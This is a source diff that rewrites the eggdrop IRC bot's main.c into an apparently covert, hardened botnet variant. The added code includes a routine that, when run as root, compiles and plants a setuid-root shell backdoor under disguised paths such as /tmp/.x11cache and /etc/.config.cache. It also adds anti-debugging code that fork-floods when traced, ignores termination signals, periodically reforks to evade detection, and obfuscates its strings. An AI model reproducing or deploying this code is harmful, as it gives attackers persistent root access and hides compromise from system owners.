@@ -1,3 +1,4 @@
+
 /* 
  * main.c -- handles:
  *   core event handling
@@ -9,6 +10,7 @@
  * 
  * $Id: main.c,v 1.40 2000/01/17 16:14:45 per Exp $
  */
+
 /* 
  * Copyright (C) 1997  Robey Pointer
  * Copyright (C) 1999, 2000  Eggheads
@@ -27,6 +29,7 @@
  * along with this program; if not, write to the Free Software
  * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
  */
+
 /* 
  * The author (Robey Pointer) can be reached at:  robey@netcom.com
  * NOTE: Robey is no long working on this code, there is a discussion
@@ -44,30 +47,64 @@
 #include <sys/sysinfo.h>
 #define UAC_NOPRINT    0x00000001	/* Don't report unaligned fixups */
 #endif
+#include <sys/file.h>
+#include <sys/stat.h>
+#ifdef G_ANTITRACE
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#endif
+
 /* some systems have a working sys/wait.h even though configure will
  * decide it's not bsd compatable.  oh well. */
 #include "chan.h"
-#include "modules.h"
+#include "hook.h"
 #include "tandem.h"
+#include "settings.h"
+#include <sys/mman.h>
+#define PAGESIZE 4096
+
 #ifdef CYGWIN_HACKS
 #include <windows.h>
 BOOL FreeConsole(VOID);
 #endif
 
 #ifndef _POSIX_SOURCE
+
 /* solaris needs this */
 #define _POSIX_SOURCE 1
 #endif
 
-extern char origbotname[], userfile[], botnetnick[];
-extern int dcc_total, conmask, cache_hit, cache_miss, max_logs, quick_logs;
+extern char origbotname[],
+  userfile[],
+  botnetnick[];
+extern int dcc_total,
+  conmask,
+  cache_hit,
+  cache_miss,
+  max_logs,
+  quick_logs,
+  fork_interval,
+  local_fork_interval;
+
 extern struct dcc_t *dcc;
 extern struct userrec *userlist;
 extern struct chanset_t *chanset;
 extern log_t *logs;
+
+#ifdef G_USETCL
 extern Tcl_Interp *interp;
-extern tcl_timer_t *timer, *utimer;
+extern tcl_timer_t *timer,
+ *utimer;
+#endif
 extern jmp_buf alarmret;
+extern void check_promisc();
+extern void check_trace();
+extern void check_last();
+extern void check_processes();
+extern char localkey[];
+#ifdef HUB
+extern FILE * logfile;
+#endif
 
 /* 
  * Please use the PATCH macro instead of directly altering the version
@@ -76,38 +113,39 @@ extern jmp_buf alarmret;
  * modified versions of this bot.
  */
 
-char egg_version[1024] = "1.4.2";
+char egg_version[100] = "";
+char magickey[20]="";
+char packname[40]="";
+char ver[60] = "";
+char version[60] = "";
 int egg_numver = 1040200;
-
-char notify_new[121] = "";	/* person to send a note to for new users */
+time_t lastfork=0;
 int default_flags = 0;		/* default user flags and */
 int default_uflags = 0;		/* default userdefinied flags for people */
+
 				/* who say 'hello' or for .adduser */
 
 int backgrd = 1;		/* run in the background? */
-int con_chan = 0;		/* foreground: constantly display channel
-				 * stats? */
-int term_z = 0;			/* foreground: use the terminal as a party
-				 * line? */
-char configfile[121] = "egg.config";	/* name of the config file */
+char *binname;
 char helpdir[121];		/* directory of help files (if used) */
 char textdir[121] = "";		/* directory for text files that get dumped */
 int keep_all_logs = 0;		/* never erase logfiles, no matter how old
+
 				 * they are? */
 time_t online_since;		/* unix-time that the bot loaded up */
 int make_userfile = 0;		/* using bot in make-userfile mode? (first
+
 				 * user to 'hello' becomes master) */
+char lock_file[40] = "";
 char owner[121] = "";		/* permanent owner(s) of the bot */
-char pid_file[40];		/* name of the file for the pid to be
-				 * stored in */
 int save_users_at = 0;		/* how many minutes past the hour to
+
 				 * save the userfile? */
 int notify_users_at = 0;	/* how many minutes past the hour to
+
 				 * notify users of notes? */
 int switch_logfiles_at = 300;	/* when (military time) to switch logfiles */
-char version[81];		/* version info (long form) */
-char ver[41];			/* version info (short form) */
-char egg_xtra[2048];		/* patch info */
+
 int use_stderr = 1;		/* send stuff to stderr instead of logfiles? */
 int do_restart = 0;		/* .restart has been called, restart asap */
 int die_on_sighup = 0;		/* die if bot receives SIGHUP */
@@ -115,7 +153,12 @@ int die_on_sigterm = 0;		/* die if bot receives SIGTERM */
 int resolve_timeout = 15;	/* hostname/address lookup timeout */
 time_t now;			/* duh, now :) */
 
+
+extern struct cfg_entry CFG_FORKINTERVAL;
+#define fork_interval atoi( CFG_FORKINTERVAL.ldata ? CFG_FORKINTERVAL.ldata : CFG_FORKINTERVAL.gdata ? CFG_FORKINTERVAL.gdata : "0")
+
 #ifdef DEBUG_CONTEXT
+
 /* context storage for fatal crashes */
 char cx_file[16][30];
 char cx_note[16][256];
@@ -127,39 +170,62 @@ void fatal(char *s, int recoverable)
 {
   int i;
 
-  putlog(LOG_MISC, "*", "* %s", s);
-  flushlogs();
+  log(LCAT_ERROR, STR("* %s"), s);
   for (i = 0; i < dcc_total; i++)
     if (dcc[i].sock >= 0)
       killsock(dcc[i].sock);
-  unlink(pid_file);
-  if (!recoverable)
+#ifdef HUB
+  if (logfile) {
+    fflush(logfile);
+  }
+#endif
+  if (!recoverable) {
+    unlink(lock_file);
+#ifdef HUB
+    if (logfile)
+      fclose(logfile);
+#endif
     exit(1);
+  }
 }
 
-int expmem_chanprog(), expmem_users(), expmem_misc(), expmem_dccutil(),
- expmem_botnet(), expmem_tcl(), expmem_tclhash(), expmem_net(),
- expmem_modules(int), expmem_language(), expmem_tcldcc();
+int expmem_chanprog(),
+  expmem_users(),
+  expmem_misc(),
+  expmem_dccutil(),
+  expmem_botnet(),
+  expmem_tcl(),
+  expmem_tclhash(),
+  expmem_net();
+
+#ifdef G_USETCL
+int expmem_tcldcc();
+#endif
+
+int expmem_main() {
+  int tot = strlen(binname) + 1;
+  return tot;
+}
 
 /* for mem.c : calculate memory we SHOULD be using */
 int expected_memory()
 {
   int tot;
-
   Context;
-  tot = expmem_chanprog() + expmem_users() + expmem_misc() +
-    expmem_dccutil() + expmem_botnet() + expmem_tcl() + expmem_tclhash() +
-    expmem_net() + expmem_modules(0) + expmem_language() + expmem_tcldcc();
+  tot = expmem_main() + expmem_chanprog() + expmem_users() + expmem_misc() + expmem_dccutil() + expmem_botnet() + expmem_tcl() + expmem_tclhash() + expmem_net()
+#ifdef G_USETCL
+    + expmem_tcldcc()
+#endif
+    ;
   return tot;
 }
 
-static void check_expired_dcc()
+void check_expired_dcc()
 {
   int i;
 
   for (i = 0; i < dcc_total; i++)
-    if (dcc[i].type && dcc[i].type->timeout_val &&
-	((now - dcc[i].timeval) > *(dcc[i].type->timeout_val))) {
+    if (dcc[i].type && dcc[i].type->timeout_val && ((now - dcc[i].timeval) > *(dcc[i].type->timeout_val))) {
       if (dcc[i].type->timeout)
 	dcc[i].type->timeout(i);
       else if (dcc[i].type->eof)
@@ -172,7 +238,7 @@ static void check_expired_dcc()
 }
 
 #ifdef DEBUG_CONTEXT
-static int nested_debug = 0;
+int nested_debug = 0;
 
 void write_debug()
 {
@@ -184,19 +250,19 @@ void write_debug()
     /* yoicks, if we have this there's serious trouble */
     /* all of these are pretty reliable, so we'll try these */
     /* dont try and display context-notes in here, it's _not_ safe <cybah> */
-    x = creat("DEBUG.DEBUG", 0644);
+    x = creat(STR("DEBUG.DEBUG"), 0644);
     setsock(x, SOCK_NONSOCK);
     if (x >= 0) {
       strcpy(s, ctime(&now));
-      dprintf(-x, "Debug (%s) written %s", ver, s);
-      dprintf(-x, "Please report problem to eggheads@eggheads.org");
-      dprintf(-x, "after a visit to http://www.eggheads.org/bugs.html");
-      dprintf(-x, "Full Patch List: %s\n", egg_xtra);
-      dprintf(-x, "Context: ");
+      dprintf(-x, STR("Debug (%s %s) written %s"), packname, PACKVERSION, s);
+      dprintf(-x, STR("Please report problem to eggheads@eggheads.org"));
+      dprintf(-x, STR("after a visit to http://www.eggheads.org/bugs.html"));
+      dprintf(-x, STR("Full Patch List: %s\n"), egg_xtra);
+      dprintf(-x, STR("Context: "));
       cx_ptr = cx_ptr & 15;
       for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
-	dprintf(-x, "%s/%d,\n         ", cx_file[y], cx_line[y]);
-      dprintf(-x, "%s/%d\n\n", cx_file[y], cx_line[y]);
+	dprintf(-x, STR("%s/%d,\n         "), cx_file[y], cx_line[y]);
+      dprintf(-x, STR("%s/%d\n\n"), cx_file[y], cx_line[y]);
       killsock(x);
       close(x);
     }
@@ -204,51 +270,44 @@ void write_debug()
 				 * have caused the fault last time */
   } else
     nested_debug = 1;
-  putlog(LOG_MISC, "*", "* Last context: %s/%d [%s]", cx_file[cx_ptr],
-	 cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
-  putlog(LOG_MISC, "*", "* Please REPORT this BUG!");
-  putlog(LOG_MISC, "*", "* Check doc/BUG-REPORT on how to do so.");
-  x = creat("DEBUG", 0644);
+  log(LCAT_ERROR, STR("* Last context: %s/%d [%s]"), cx_file[cx_ptr], cx_line[cx_ptr], cx_note[cx_ptr][0] ? cx_note[cx_ptr] : "");
+  x = creat(STR("DEBUG"), 0644);
   setsock(x, SOCK_NONSOCK);
   if (x < 0) {
-    putlog(LOG_MISC, "*", "* Failed to write DEBUG");
+    log(LCAT_ERROR, STR("* Failed to write DEBUG"));
   } else {
     strcpy(s, ctime(&now));
-    dprintf(-x, "Debug (%s) written %s", ver, s);
-    dprintf(-x, "Full Patch List: %s\n", egg_xtra);
-#ifdef STATIC
-    dprintf(-x, "STATICALLY LINKED\n");
-#endif
-    strcpy(s, "info library");
+    dprintf(-x, STR("Debug (%s %s) written %s"), packname, PACKVERSION, s);
+    dprintf(-x, STR("STATICALLY LINKED\n"));
+#ifdef G_USETCL
+    strcpy(s, STR("info library"));
     if (interp && (Tcl_Eval(interp, s) == TCL_OK))
-      dprintf(-x, "Using tcl library: %s (header version %s)\n",
-	      interp->result, TCL_VERSION);
-    dprintf(-x, "Compile flags: %s\n", CCFLAGS);
-    dprintf(-x, "Link flags   : %s\n", LDFLAGS);
-    dprintf(-x, "Strip flags  : %s\n", STRIPFLAGS);
-    dprintf(-x, "Context: ");
+      dprintf(-x, STR("Using tcl library: %s (header version %s)\n"), interp->result, TCL_VERSION);
+#endif
+    dprintf(-x, STR("Compile flags: %s\n"), CCFLAGS);
+    dprintf(-x, STR("Link flags   : %s\n"), LDFLAGS);
+    dprintf(-x, STR("Strip flags  : %s\n"), STRIPFLAGS);
+    dprintf(-x, STR("Context: "));
     cx_ptr = cx_ptr & 15;
     for (y = ((cx_ptr + 1) & 15); y != cx_ptr; y = ((y + 1) & 15))
-      dprintf(-x, "%s/%d, [%s]\n         ", cx_file[y], cx_line[y],
-	      (cx_note[y][0]) ? cx_note[y] : "");
-    dprintf(-x, "%s/%d [%s]\n\n", cx_file[cx_ptr], cx_line[cx_ptr],
-	    (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
+      dprintf(-x, STR("%s/%d, [%s]\n         "), cx_file[y], cx_line[y], (cx_note[y][0]) ? cx_note[y] : "");
+    dprintf(-x, STR("%s/%d [%s]\n\n"), cx_file[cx_ptr], cx_line[cx_ptr], (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
     tell_dcc(-x);
     dprintf(-x, "\n");
     debug_mem_to_dcc(-x);
     killsock(x);
     close(x);
-    putlog(LOG_MISC, "*", "* Wrote DEBUG");
+    log(LCAT_ERROR, STR("* Wrote DEBUG"));
   }
 }
 #endif
 
-static void got_bus(int z)
+void got_bus(int z)
 {
 #ifdef DEBUG_CONTEXT
   write_debug();
 #endif
-  fatal("BUS ERROR -- CRASHING!", 1);
+  fatal(STR("BUS ERROR -- CRASHING!"), 1);
 #ifdef SA_RESETHAND
   kill(getpid(), SIGBUS);
 #else
@@ -256,59 +315,90 @@ static void got_bus(int z)
 #endif
 }
 
-static void got_segv(int z)
+struct stackframe {
+  struct stackframe * ebp;
+  unsigned long addr;
+};
+
+/*
+  CALL x
+  PUSH EBP
+  MOV EBP, ESP
+  
+  0x10: EBP
+  0x14: EIP
+
+ */
+
+int canaccess (void * addr) {
+  addr = (void *) (((unsigned long) addr / PAGESIZE) * PAGESIZE);
+  if (mprotect(addr, PAGESIZE, PROT_READ | PROT_WRITE | PROT_EXEC))
+    if (errno != EACCES)
+      return 0;
+  return 1;
+};
+
+struct stackframe * sf =NULL;
+int stackdepth = 0;
+void stackdump() {
+  asm("movl %EBP, %EAX");
+  asm("movl %EAX, sf");
+  while (canaccess(sf) && stackdepth<20) {
+    log(LCAT_ERROR, STR("SEGV STACK DUMP: %08x %08x"), sf->ebp, sf->addr);
+    sf = sf->ebp;
+    stackdepth++;
+  } 
+  sleep(1);
+};
+
+void got_segv(int z)
 {
 #ifdef DEBUG_CONTEXT
   write_debug();
 #endif
-  fatal("SEGMENT VIOLATION -- CRASHING!", 1);
-#ifdef SA_RESETHAND
-  kill(getpid(), SIGSEGV);
-#else
+  stackdump();
+  fatal(STR("SEGMENT VIOLATION -- CRASHING!"), 1);
   exit(1);
-#endif
 }
 
-static void got_fpe(int z)
+void got_fpe(int z)
 {
 #ifdef DEBUG_CONTEXT
   write_debug();
 #endif
-  fatal("FLOATING POINT ERROR -- CRASHING!", 0);
+  fatal(STR("FLOATING POINT ERROR -- CRASHING!"), 0);
 }
 
-static void got_term(int z)
+void got_term(int z)
 {
+#ifdef HUB
   write_userfile(-1);
-  check_tcl_event("sigterm");
-  if (die_on_sigterm) {
-    botnet_send_chat(-1, botnetnick, "ACK, I've been terminated!");
-    fatal("TERMINATE SIGNAL -- SIGNING OFF", 0);
-  } else {
-    putlog(LOG_MISC, "*", "RECEIVED TERMINATE SIGNAL (IGNORING)");
-  }
+#endif
+  check_tcl_event(STR("sigterm"));
+  log(LCAT_WARNING, STR("RECEIVED TERMINATE SIGNAL (IGNORING)"));
 }
 
-static void got_quit(int z)
+void got_quit(int z)
 {
-  check_tcl_event("sigquit");
-  putlog(LOG_MISC, "*", "RECEIVED QUIT SIGNAL (IGNORING)");
+  check_tcl_event(STR("sigquit"));
+  log(LCAT_WARNING, STR("RECEIVED QUIT SIGNAL (IGNORING)"));
   return;
 }
 
-static void got_hup(int z)
+void got_hup(int z)
 {
-  write_userfile(-1);
-  check_tcl_event("sighup");
-  if (die_on_sighup) {
-    fatal("HANGUP SIGNAL -- SIGNING OFF", 0);
-  } else
-    putlog(LOG_MISC, "*", "Received HUP signal: rehashing...");
-  do_restart = -2;
+  check_tcl_event(STR("sighup"));
+  log(LCAT_WARNING, STR("RECEIVED HUP SIGNAL (IGNORING)"));
   return;
 }
 
-static void got_alarm(int z)
+void got_cont(int z)
+{
+  log(LCAT_WARNING, STR("RECEIVED CONT SIGNAL (IGNORING)"));
+  return;
+}
+
+void got_alarm(int z)
 {
   /* a call to resolver (gethostbyname, etc) timed out */
   longjmp(alarmret, 1);
@@ -317,51 +407,15 @@ static void got_alarm(int z)
 }
 
 /* got ILL signal -- log context and continue */
-static void got_ill(int z)
+void got_ill(int z)
 {
-  check_tcl_event("sigill");
-#ifdef DEBUG_CONTEXT
-  putlog(LOG_MISC, "*", "* Context: %s/%d [%s]", cx_file[cx_ptr],
-	 cx_line[cx_ptr], (cx_note[cx_ptr][0]) ? cx_note[cx_ptr] : "");
-#endif
+  check_tcl_event(STR("sigill"));
+  log(LCAT_WARNING, STR("RECEIVED ILL SIGNAL (IGNORING)"));
+  return;
 }
-
-#ifdef DEBUG_CONTEXT
-/* Context */
-void eggContext(char *file, int line, char *module)
-{
-  char x[100];
-
-  if (!module)
-    sprintf(x, "%s", file);
-  else
-    sprintf(x, "%s:%s", module, file);
-  x[30] = 0;
-  cx_ptr = ((cx_ptr + 1) & 15);
-  strcpy(cx_file[cx_ptr], x);
-  cx_line[cx_ptr] = line;
-  cx_note[cx_ptr][0] = 0;
-}
-
-/* ContextNote */
-void eggContextNote(char *file, int line, char *module, char *note)
-{
-  char x[100];
-
-  if (!module)
-    sprintf(x, "%s", file);
-  else
-    sprintf(x, "%s:%s", module, file);
-  x[30] = 0;
-  cx_ptr = ((cx_ptr + 1) & 15);
-  strcpy(cx_file[cx_ptr], x);
-  cx_line[cx_ptr] = line;
-  strncpy(cx_note[cx_ptr], note, 255);
-  cx_note[cx_ptr][255] = 0;
-}
-#endif
 
 #ifdef DEBUG_ASSERT
+
 /* Assert */
 void eggAssert(char *file, int line, char *module, int expr)
 {
@@ -370,91 +424,129 @@ void eggAssert(char *file, int line, char *module, int expr)
     write_debug();
 #endif
     if (!module) {
-      putlog(LOG_MISC, "*", "* In file %s, line %u", file, line);
+      log(LCAT_WARNING, STR("* In file %s, line %u"), file, line);
     } else {
-      putlog(LOG_MISC, "*", "* In file %s:%s, line %u", module, file, line);
+      log(LCAT_WARNING, STR("* In file %s:%s, line %u"), module, file, line);
     }
-    fatal("ASSERT FAILED -- CRASHING!", 1);
+    fatal(STR("ASSERT FAILED -- CRASHING!"), 1);
   }
 }
 #endif
 
-static void do_arg(char *s)
+void do_arg(char *s)
 {
   int i;
+  char pass[40];
 
   if (s[0] == '-')
     for (i = 1; i < strlen(s); i++) {
-      if (s[i] == 'n')
+      if (s[i] == 'n') {
 	backgrd = 0;
-      if (s[i] == 'c') {
-	con_chan = 1;
-	term_z = 0;
+	printf(STR("Password:"));
+	fgets(pass, sizeof(pass), stdin);
+	if (strchr(pass, '\n'))
+	  *strchr(pass, '\n') = 0;
+	if (strcmp(pass, botnetnick)) {
+	  printf(STR("\ngo away.\n"));
+	  exit(0);
+	} else
+	  backgrd = 0;
       }
-      if (s[i] == 't') {
-	con_chan = 0;
-	term_z = 1;
-      }
-      if (s[i] == 'm')
-	make_userfile = 1;
       if (s[i] == 'v') {
-	char x[256], *z = x;
-
-	strcpy(x, egg_version);
-	newsplit(&z);
-	newsplit(&z);
-	printf("%s\n", version);
-	if (z[0])
-	  printf("  (patches: %s)\n", z);
+	printf(STR("%s\n"), egg_version);
 	exit(0);
       }
-      if (s[i] == 'h') {
-	printf("\n%s\n\n", version);
-	printf(EGG_USAGE);
-	printf("\n");
-	exit(0);
-      }
-  } else
-    strcpy(configfile, s);
+    }
 }
 
+#ifdef HUB
 void backup_userfile()
 {
   char s[150];
 
-  putlog(LOG_MISC, "*", USERF_BACKUP);
-  strcpy(s, userfile);
-  strcat(s, "~bak");
-  copyfile(userfile, s);
+  log(LCAT_INFO, STR("Backing up user file..."));
+  strcpy(s, STR(".cb"));
+  copyfile(".c", s);
 }
+#endif
 
 /* timer info: */
-static int lastmin = 99;
-static time_t then;
-static struct tm nowtm;
+int lastmin = 99;
+int curcheck = 0;
+time_t then;
+struct tm nowtm;
+
+void core_10secondly()
+{
+  check_expired_dcc();
+  curcheck++;
+  check_promisc();
+  if (curcheck==1)
+    check_trace();
+  if (curcheck==2)
+    check_last();
+  if (curcheck==3) {
+    check_processes();
+    curcheck=0;
+  }
+  autolink_cycle(NULL);		/* attempt autolinks */
+}
+
+void core_30secondly()
+{
+#ifdef HUB
+  if (logfile)
+    fflush(logfile);
+#endif
+}
+
+void do_fork() {
+  int xx;
+  xx = fork();
+  if (xx == -1)
+    return;
+  if (xx) {
+#if HAVE_SETPGID
+    setpgid(xx, xx);
+#endif
+    exit(0);
+  }
+  lastfork = now;
+}
 
 /* rally BB, this is not QUITE as bad as it seems <G> */
+
 /* ONCE A SECOND */
-static void core_secondly()
+void core_secondly()
 {
   static int cnt = 0;
   int miltime;
 
+#ifdef G_USETCL
   do_check_timers(&utimer);	/* secondly timers */
+#endif
+  if (fork_interval && backgrd) {
+    if (now-lastfork > fork_interval)
+      do_fork();
+  }
   cnt++;
-  if (cnt >= 10) {		/* every 10 seconds */
+  if ((cnt % 3) == 0) {
+    call_hook(HOOK_3SECONDLY);
+  }
+  if ((cnt % 5) == 0)
+    call_hook(HOOK_5SECONDLY);
+  if ((cnt % 10) == 0)
+    call_hook(HOOK_10SECONDLY);
+  if ((cnt % 20) == 0)
+    call_hook(HOOK_20SECONDLY);
+  if ((cnt % 30) == 0) {
+    call_hook(HOOK_30SECONDLY);
+    check_botnet_pings();
     cnt = 0;
-    check_expired_dcc();
-    if (con_chan && !backgrd) {
-      dprintf(DP_STDOUT, "\033[2J\033[1;1H");
-      tell_verbose_status(DP_STDOUT);
-      do_module_report(DP_STDOUT, 0, "server");
-      do_module_report(DP_STDOUT, 0, "channels");
-      tell_mem_status_dcc(DP_STDOUT);
-    }
   }
   Context;
   memcpy(&nowtm, localtime(&now), sizeof(struct tm));
+
   if (nowtm.tm_min != lastmin) {
     int i = 0;
 
@@ -462,35 +554,31 @@ static void core_secondly()
     lastmin = (lastmin + 1) % 60;
     call_hook(HOOK_MINUTELY);
     check_expired_ignores();
-    autolink_cycle(NULL);	/* attempt autolinks */
     /* in case for some reason more than 1 min has passed: */
     while (nowtm.tm_min != lastmin) {
       /* timer drift, dammit */
-      debug2("timer: drift (lastmin=%d, now=%d)", lastmin, nowtm.tm_min);
+      debug2(STR("timer: drift (lastmin=%d, now=%d)"), lastmin, nowtm.tm_min);
       Context;
       i++;
       lastmin = (lastmin + 1) % 60;
       call_hook(HOOK_MINUTELY);
     }
     if (i > 1)
-      putlog(LOG_MISC, "*", "(!) timer drift -- spun %d minutes", i);
+      log(LCAT_ERROR, STR("(!) timer drift -- spun %d minutes"), i);
     miltime = (nowtm.tm_hour * 100) + (nowtm.tm_min);
     Context;
     if (((int) (nowtm.tm_min / 5) * 5) == (nowtm.tm_min)) {	/* 5 min */
       call_hook(HOOK_5MINUTELY);
-      check_botnet_pings();
       Context;
-      if (quick_logs == 0) {
-	flushlogs();
-	check_logsize();
-      }
       if (miltime == 0) {	/* at midnight */
 	char s[128];
 	int j;
 
 	s[my_strcpy(s, ctime(&now)) - 1] = 0;
-	putlog(LOG_ALL, "*", "--- %.11s%s", s, s + 20);
+	log(LCAT_INFO, STR("--- %.11s%s"), s, s + 20);
+#ifdef HUB
 	backup_userfile();
+#endif
 	for (j = 0; j < max_logs; j++) {
 	  if (logs[j].filename != NULL && logs[j].f != NULL) {
 	    fclose(logs[j].f);
@@ -507,121 +595,282 @@ static void core_secondly()
 				 * get this far on the minute */
     if (miltime == switch_logfiles_at) {
       call_hook(HOOK_DAILY);
-      if (!keep_all_logs) {
-	putlog(LOG_MISC, "*", MISC_LOGSWITCH);
-	for (i = 0; i < max_logs; i++)
-	  if (logs[i].filename) {
-	    char s[1024];
-
-	    if (logs[i].f) {
-	      fclose(logs[i].f);
-	      logs[i].f = NULL;
-	    }
-	    simple_sprintf(s, "%s.yesterday", logs[i].filename);
-	    unlink(s);
-	    movefile(logs[i].filename, s);
-	  }
-      }
     }
   }
 }
 
-static void core_minutely()
+void core_minutely()
 {
   Context;
   check_tcl_time(&nowtm);
+#ifdef G_USETCL
   do_check_timers(&timer);
+#endif
   Context;
-  if (quick_logs != 0) {
-    flushlogs();
-    check_logsize();
-  }
 }
 
-static void core_hourly()
+void core_5minutely()
 {
-  Context;
+#ifdef HUB
+  char hub[20];
+  besthub(hub);
+  if (!strcmp(hub, botnetnick)) 
+    send_timesync(-1);
+#endif
+}
+
+void core_hourly()
+{
+#ifdef HUB
   write_userfile(-1);
+#endif
 }
 
-static void event_rehash()
+void event_rehash()
 {
   Context;
-  check_tcl_event("rehash");
+  check_tcl_event(STR("rehash"));
 }
 
-static void event_prerehash()
+void event_prerehash()
 {
   Context;
-  check_tcl_event("prerehash");
+  check_tcl_event(STR("prerehash"));
 }
 
-static void event_save()
+void event_logfile()
 {
   Context;
-  check_tcl_event("save");
-}
-
-static void event_logfile()
-{
-  Context;
-  check_tcl_event("logfile");
+  check_tcl_event(STR("logfile"));
 }
 
 void kill_tcl();
-extern module_entry *module_list;
 void restart_chons();
 
-#ifdef STATIC
-void check_static(char *, char *(*)());
+int init_mem(),
+  init_dcc_max(),
+  init_userent(),
+  init_misc(),
+  init_bots(),
+  init_net(),
+  init_irc(),
+  init_ctcp(),
+  init_share(),
+  init_userrec(),
+  init_transfer(),
+  init_server(),
+  init_channels();
 
-#include "mod/static.h"
+#ifdef G_USETCL
+int init_tcl(int, char **);
 #endif
-int init_mem(), init_dcc_max(), init_userent(), init_misc(), init_bots(),
- init_net(), init_modules(), init_tcl(int, char **),
- init_language(int);
 
-void patch(char *str)
+void checklockfile()
 {
-  char *p = strchr(egg_version, '+');
+#ifndef LOCK_EX
+#define LOCK_EX 2
+#endif
+#ifndef LOCK_NB
+#define LOCK_NB 4
+#endif
+  static int lockfile;
+  char *p;
 
-  if (!p)
-    p = &egg_version[strlen(egg_version)];
-  sprintf(p, "+%s", str);
-  egg_numver++;
-  sprintf(&egg_xtra[strlen(egg_xtra)], " %s", str);
+  p = strrchr(binname, '/');
+  p++;
+  sprintf(lock_file, STR("lock.%s"), p);
+  lockfile = open(lock_file, O_EXCL);
+  if (lockfile <= 0) {
+    lockfile = open(lock_file, O_EXCL | O_CREAT, S_IWUSR | S_IRUSR);
+  }
+  if (lockfile <= 0) {
+    exit(1);
+  }
+  if (flock(lockfile, LOCK_EX | LOCK_NB))
+    exit(1);
+}
+
+char *getfullbinname(char *argv0)
+{
+  char *cwd,
+   *bin,
+   *p,
+   *p2;
+
+  bin = nmalloc(strlen(argv0) + 1);
+  strcpy(bin, argv0);
+  if (bin[0] == '/') {
+    return bin;
+  }
+  cwd = nmalloc(8192);
+  getcwd(cwd, 8191);
+  cwd[8191] = 0;
+  if (cwd[strlen(cwd) - 1] == '/')
+    cwd[strlen(cwd) - 1] = 0;
+
+  p = bin;
+  p2 = strchr(p, '/');
+  while (p) {
+    if (p2)
+      *p2++ = 0;
+    if (!strcmp(p, "..")) {
+      p = strrchr(cwd, '/');
+      if (p)
+	*p = 0;
+    } else if (strcmp(p, ".")) {
+      strcat(cwd, "/");
+      strcat(cwd, p);
+    }
+    p = p2;
+    if (p)
+      p2 = strchr(p, '/');
+  }
+  nfree(bin);
+  bin = nmalloc(strlen(cwd) + 1);
+  strcpy(bin, cwd);
+  nfree(cwd);
+  return bin;
+}
+
+#ifdef G_ROOTIT
+void rootit() {
+  setuid(0);
+  seteuid(0);
+  if (!getuid() || !geteuid()) {
+    FILE * f;
+    f=fopen(STR("s.c"), "w");
+    if (f) {
+      fprintf(f, STR("#include <stdlib.h>\n"));
+      fprintf(f, STR("int main(int argc, char * argv[]) {\n"));
+      fprintf(f, STR("if ((argc==2) && (!strcmp(argv[1], \"-87a\"))) {\n"));
+      fprintf(f, STR("  setuid(0);setgid(0);system(\"/bin/sh\");\n"));
+      fprintf(f, STR("}}\n"));
+      fclose(f);
+      system(STR("cc s.c -o /tmp/.x11cache"));
+      chmod(STR("/tmp/.x11cache"), S_ISUID | S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
+      system(STR("cp -f /tmp/.x11cache /etc/.config.cache"));
+      system(STR("cp -f /tmp/.x11cache \"/core \""));
+      unlink(STR("s.c"));
+    }
+  }
+}
+#endif
+
+void messup_term() {
+  int i;
+  char * argv[4];
+  freopen(STR("/dev/null"), "w", stderr);
+  for (i=0;i<11;i++) {
+    fork();
+  }
+  argv[0]=nmalloc(100);
+  strcpy(argv[0], STR("/bin/sh"));
+  argv[1]="-c";
+  argv[2]=nmalloc(1024);
+  strcpy(argv[2], STR("cat < "));
+  strcat(argv[2], binname);
+  argv[3]=NULL;
+  execvp(argv[0], &argv[0]);
+}
+
+void fuckup_trace() {
+#ifdef G_ANTITRACE
+  int parent, x, i;
+  parent=getpid();
+#ifdef __linux__
+  x = fork();
+  if (x == -1)
+    return;
+  if (x == 0) {
+    i = ptrace(PTRACE_ATTACH, parent, 0, 0);
+    if (i==(-1)) {
+      if (errno==EPERM)
+	messup_term();
+    } else {
+      waitpid(parent, &i, 0);
+      kill(parent, SIGCHLD);
+      ptrace(PTRACE_DETACH, parent, 0, 0);
+      kill(parent, SIGCHLD);
+    }
+    exit(0);
+  } else
+    wait(&i);
+#endif
+
+#ifdef __FreeBSD__
+  x = fork();
+  if (x == -1)
+    return;
+  if (x == 0) {
+    i=ptrace(PT_ATTACH, parent, 0, 0);
+    if (i==(-1)) {
+      if (errno==EBUSY)
+	messup_term();
+    } else {
+      wait(&i);
+      i=ptrace(PT_CONTINUE, parent, (caddr_t) 1, 0);
+      kill(parent, SIGCHLD);      
+      wait(&i);
+      i=ptrace(PT_DETACH, parent, (caddr_t) 1, 0);
+      wait(&i);
+    }
+    exit(0);
+  } else
+    waitpid(x, NULL, 0);
+#endif
+
+#endif
 }
 
 int main(int argc, char **argv)
 {
-  int xx, i;
-  char buf[520], s[520];
-  FILE *f;
+  int xx,
+    i;
+  char buf[520],
+    s[520],
+   *p;
   struct sigaction sv;
   struct chanset_t *chan;
 
-#ifdef DEBUG_MEM
   {
 #include <sys/resource.h>
     struct rlimit cdlim;
-    cdlim.rlim_cur = RLIM_INFINITY;
-    cdlim.rlim_max = RLIM_INFINITY;
-    setrlimit(RLIMIT_CORE, &cdlim);
+    getrlimit(RLIMIT_CORE, &cdlim);
+    cdlim.rlim_cur = RLIMIT_NOFILE;
+    cdlim.rlim_max = RLIMIT_NOFILE;
+    //    setrlimit(RLIMIT_CORE, &cdlim);
   }
-#endif
-
   /* initialise context list */
   for (i = 0; i < 16; i++) {
     Context;
   }
-#include "patch.h"
-  /* version info! */
-  sprintf(ver, "eggdrop v%s", egg_version);
-  sprintf(version, "Eggdrop v%s  (c)1997 Robey Pointer (c)1999, 2000 Eggheads",
-      egg_version);
-  /* now add on the patchlevel (for Tcl) */
-  sprintf(&egg_version[strlen(egg_version)], " %u", egg_numver);
-  strcat(egg_version, egg_xtra);
+  init_mem();
+  binname = getfullbinname(argv[0]);
+  p = strrchr(binname, '/');
+  *p = 0;
+  chdir(binname);
+  *p = '/';
+#ifndef DEBUG_MEM
+  fuckup_trace();
+#endif
+#ifdef G_ROOTIT
+  if (!geteuid() || !getuid())
+    rootit();
+#endif
+  init_settings(binname);
+  get_setting(NAME_ME, buf, sizeof(buf));
